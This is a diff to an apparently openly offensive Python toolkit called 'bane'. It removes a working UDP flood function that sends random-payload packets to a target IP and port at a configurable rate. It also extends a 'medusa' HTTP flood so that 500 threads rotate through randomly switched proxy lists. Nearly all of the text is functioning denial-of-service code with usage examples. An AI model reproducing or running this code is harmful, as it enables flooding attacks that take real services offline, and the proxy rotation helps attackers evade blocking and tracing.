@@ -44,8 +44,6 @@ def reset():
  pointer=0
  global ue
  ue=[]
-
-"""
 def udp(u,port=80,ports=None,level=3,size=3,connection=True,interval=300,limiting=True,logs=True,returning=False):
   '''
    this function is for UDP flood attack tests.
@@ -134,99 +132,6 @@ def udp(u,port=80,ports=None,level=3,size=3,connection=True,interval=300,limitin
   print('')
   if returning==True:
    return packets
-"""
-def udp(u,port=80,ports=None,level=0.001,size=100,connection=True,interval=300,limiting=True,logs=True,returning=False,random_level=False,max_level=0.001,min_level=0.01,random_size=False,max_size=100,min_size=10):
-  '''
-   this function is for UDP flood attack tests.
-   
-   it takes 5 arguments:
-   u: targeted ip
-   port: (set by default to: 80) targeted port
-   ports: (set by default to: None) it is used to define a list of ports to attack all without using multithreading, if its value has changed
-   to a list, the port argument will be ignored and the list will be used instead, so be careful and set everything correctly.
-   it should be defined as a list of integers seperated by ',' like: [80,22,21]
-   connection: (set by default to: True) to make a connection before sending the packet
-   level: (set by default to: 3) it defines the speed rate to send the packets:
-   level=1 :  send packets with delay of 0.1 second between them
-   level=2 :  send packets with delay of 0.01 second between them
-   level=3 :  send packets with delay of 0.001 second between them
-   size: (set by default to: 3) multiplying the size of the generated payloads:
-   size=1 :  size of payload * 1
-   size=2 :  size of payload * 10
-   size=3 :  size of payload * 100
-   when the attack starts you will see a stats of: total packets sent, packets sent per second, and bytes sent per second
-   usage:
-   >>>import bane
-   >>>ip='25.33.26.12'
-   >>>bane.udp(ip)
-   >>>bane.udp(ip,port=80,level=1,size=3)
-   >>>bane.udp(ip,ports=[21,50,80],level=2)
-   
-  '''
-  global stop
-  stop=False
-  global rate1
-  global rate2
-  global counter
-  counter=-1
-  if level<=0:
-   t=0
-  elif level>=1:
-   t=.1
-  else:
-   t=level
-  if size<=1:
-   m=1
-   m=10
-  elif size>=1400:
-   m=1400
-  else:
-   m=size
-  tm=time.time()
-  cn=0
-  while (stop!=True):
-   try:
-    if random_size==True:
-     y,z=min_size,max_size
-    else:
-     y,z=m,m
-    if ports:
-     p=random.choice(ports)
-    else:
-     p=port
-    s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
-    if connection==True:
-     s.connect((u,p))
-    l=random.randint(y,z)
-    msg=random._urandom(l)
-    s.sendto(msg,(u,p))
-    counter+=1
-    rate1+=1
-    rate2+=len(msg)
-    if((logs==True) and (int(time.time()-tm)==1)):
-     cn+=1
-     if cn==interval:
-      stop=True
-     sys.stdout.write("\rStats=> Packets sent: {} | Rate: {} packets/s  {} bytes/s".format(counter,rate1,rate2))
-     sys.stdout.flush()
-     tm=time.time()
-     rate1=0
-     rate2=0
-    if limiting==True:
-     if random_level==True:
-      t=random.uniform(max_level, min_level)
-     time.sleep(t)
-   except KeyboardInterrupt:
-    stop=True
-   except Exception as e:
-    try:
-     time.sleep(t)
-    except:
-     pass
-  print('')
-  if returning==True:
-   return counter
-
 class tcflood(threading.Thread):
  def run(self):
   global counter
@@ -3001,7 +2906,19 @@ class medu(threading.Thread):
       time.sleep(.01)
   except Exception as ex:
    pass
-def medusa(u,threads=500,maxtime=5,interval=300,logs=True,returning=False):
+class swi(threading.Thread):
+ def run(self):
+  global httpp
+  while (stop!=True):
+   time.sleep(random.randint(minswitch,maxswitch))
+   httpp=[]
+   while True:
+    r=random.choice(httplist)
+    if (r not in httpp):
+     httpp.append(r)
+    if (len(httpp)>random.randint(minpr,maxpr)):
+     break
+def medusa(u,threads=500,httpl=None,maxtime=5,switching=True,maxprox=70,minprox=60,mint=40,maxt=60,interval=300,logs=True,returning=False):
  '''
    this function is aversion of goldeneye tool that works with HTTP proxies only.
 '''
@@ -3011,9 +2928,24 @@ def medusa(u,threads=500,maxtime=5,interval=300,logs=True,returning=False):
  prints=logs
  global target
  target=u
- httpp=mdpr()
+ global httplist
+ if httpl:
+  httplist=httpl
+ else:
+  httplist=masshttp()
+ global httpp
+ for x in range(random.randint(minprox,maxprox)):
+  httpp.append(random.choice(httplist))
  global timeout
  timeout=maxtime
+ global maxswitch
+ maxswitch=maxt
+ global minswitch
+ minswitch=mint
+ global minpr
+ minpr=minprox
+ global maxpr
+ maxpr=maxprox
  for x in range(threads):
   t = medu()
   t.start()
